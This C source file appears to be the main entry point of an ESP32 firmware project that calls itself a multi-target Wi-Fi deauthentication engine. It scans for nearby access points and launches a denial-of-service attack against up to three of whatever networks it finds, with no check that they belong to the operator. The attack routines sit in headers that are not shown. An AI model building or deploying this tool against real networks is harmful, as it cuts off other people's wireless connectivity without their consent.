/**
 * @file main.c
 * @author TaxCoding (raja.naufal1605@student.unri.ac.id)
 * @date 2026
 * @copyright Copyright (c) 2026
 * 
 * @brief Main application entry point for the ESP32 multi-target Wi-Fi deauth engine.
 */

#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "attack_dos.h"
#include "ap_scanner.h"

/**
 * @brief Main application entry point.
 */
void app_main(void) {
    ESP_LOGI("main", "System initialization...");

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    wifictl_scan_nearby_aps();
    const wifictl_ap_records_t *records = wifictl_get_ap_records();

    if (records->count == 0) {
        ESP_LOGW("main", "No Access Points found!");
        return;
    }

    attack_dos_init();

    int limit = records->count < 3 ? records->count : 3;
    for (int i = 0; i < limit; i++) {
        attack_dos_add_target(&records->records[i]);
    }

    attack_dos_start_multi();
}